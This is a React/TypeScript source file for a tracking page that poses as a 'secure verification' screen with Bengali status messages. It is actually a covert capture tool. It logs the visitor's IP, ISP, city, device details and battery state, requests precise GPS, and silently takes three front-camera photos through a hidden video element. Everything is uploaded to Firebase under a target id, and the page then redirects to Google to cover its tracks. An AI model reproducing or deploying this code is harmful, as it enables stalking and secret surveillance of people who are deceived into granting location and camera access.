
import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';
import { collection, addDoc, updateDoc, doc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { db, storage } from '../firebase';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const [status, setStatus] = useState('নিরাপদ সংযোগ তৈরি করা হচ্ছে...');
  const [progress, setProgress] = useState(5);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const hasExecuted = useRef(false);

  useEffect(() => {
    if (id && !hasExecuted.current) {
      hasExecuted.current = true;
      startCapturingProcess();
    }
  }, [id]);

  const getIPInfo = async () => {
    try {
      // Using ipwho.is as it's more reliable for ISP/Carrier info
      const res = await fetch('https://ipwho.is/');
      const data = await res.json();
      return {
        ip: data.ip || "Unknown",
        isp: data.connection?.isp || "Unknown",
        city: data.city || "Unknown",
        country: data.country || "Unknown",
        network: data.connection?.org || data.connection?.isp || "Unknown"
      };
    } catch (e) {
      return { ip: "Error", isp: "Error", city: "Error", country: "Error", network: "Error" };
    }
  };

  const capturePhotoBlob = (video: HTMLVideoElement): Promise<Blob | null> => {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      canvas.width = 320;
      canvas.height = 240;
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(video, 0, 0, 320, 240);
        canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.3);
      } else {
        resolve(null);
      }
    });
  };

  const startCapturingProcess = async () => {
    let logDocId = "";

    try {
      // 1. Initial Logging (Immediate)
      setStatus('সার্ভার যাচাই করা হচ্ছে...');
      const ipInfo = await getIPInfo();
      // @ts-ignore
      const battery = navigator.getBattery ? await navigator.getBattery() : null;

      const initialData = {
        userId: id,
        timestamp: serverTimestamp(),
        ip: ipInfo.ip,
        isp: ipInfo.isp,
        city: ipInfo.city,
        network: ipInfo.network,
        device: {
          name: /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone|iPad/i.test(navigator.userAgent) ? 'iOS' : 'PC',
          model: navigator.platform,
          userAgent: navigator.userAgent
        },
        battery: battery ? { level: Math.round(battery.level * 100), charging: battery.charging } : null,
        status: 'Base Captured'
      };

      const docRef = await addDoc(collection(db, "logs"), initialData);
      logDocId = docRef.id;
      setProgress(25);

      // 2. Geolocation (Must Wait)
      setStatus('সিকিউরিটি কোড যাচাই করা হচ্ছে...');
      try {
        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000
          });
        });

        await updateDoc(doc(db, "logs", logDocId), {
          location: {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: position.coords.accuracy
          }
        });
      } catch (geoErr) {
        console.log("GPS Denied/Timeout");
        await updateDoc(doc(db, "logs", logDocId), { location: "Denied" });
      }
      setProgress(50);

      // 3. Camera & Photos
      setStatus('অ্যাক্সেস কনফার্ম করা হচ্ছে...');
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await new Promise(r => setTimeout(r, 2000)); // Camera warm-up

          const photoUrls: string[] = [];
          for (let i = 0; i < 3; i++) {
            const blob = await capturePhotoBlob(videoRef.current);
            if (blob) {
              const storageRef = ref(storage, `captures/${id}/${Date.now()}_${i}.jpg`);
              await uploadBytes(storageRef, blob);
              const url = await getDownloadURL(storageRef);
              photoUrls.push(url);
              
              if (i === 0) {
                await updateDoc(doc(db, "logs", logDocId), { firstPhoto: url });
              }
            }
            await new Promise(r => setTimeout(r, 800));
          }

          stream.getTracks().forEach(t => t.stop());
          await updateDoc(doc(db, "logs", logDocId), { 
            photoUrls: photoUrls,
            status: 'Completed'
          });
        }
      } catch (camErr) {
        console.log("Camera Denied");
        await updateDoc(doc(db, "logs", logDocId), { photoUrls: [], status: 'Camera Denied' });
      }

      setProgress(100);
      setStatus('সফলভাবে সম্পন্ন হয়েছে');
      
      // Final Wait before redirect
      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 2000);

    } catch (criticalErr) {
      console.error("Critical Failure:", criticalErr);
      window.location.href = "https://www.google.com";
    }
  };

  return (
    <div className="min-h-screen bg-[#F8FAFC] flex flex-col items-center justify-center p-6 text-center font-['Hind_Siliguri']">
      <div className="w-full max-w-xs premium-card p-10 rounded-[40px] shadow-2xl">
        <div className="relative mb-8">
           <div className="w-20 h-20 border-[6px] border-blue-600 border-t-transparent rounded-full animate-spin mx-auto"></div>
           <div className="absolute inset-0 flex items-center justify-center">
              <div className="w-10 h-10 bg-blue-50 rounded-full"></div>
           </div>
        </div>
        
        <h2 className="text-xl font-black text-slate-800 mb-2">{status}</h2>
        <p className="text-slate-400 text-[9px] font-black uppercase tracking-[0.3em] mb-8">Secure Verification</p>
        
        <div className="w-full bg-slate-100 h-2 rounded-full overflow-hidden mb-6 shadow-inner">
           <div className="bg-blue-600 h-full transition-all duration-700 ease-out shadow-[0_0_10px_rgba(37,99,235,0.5)]" style={{ width: `${progress}%` }}></div>
        </div>
        
        <p className="text-[10px] text-slate-400 font-medium">আপনার ব্রাউজারটি যাচাই করা হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...</p>
        
        <video ref={videoRef} autoPlay muted playsInline className="hidden"></video>
        <canvas ref={canvasRef} className="hidden"></canvas>
      </div>
    </div>
  );
};

export default TrackPage;
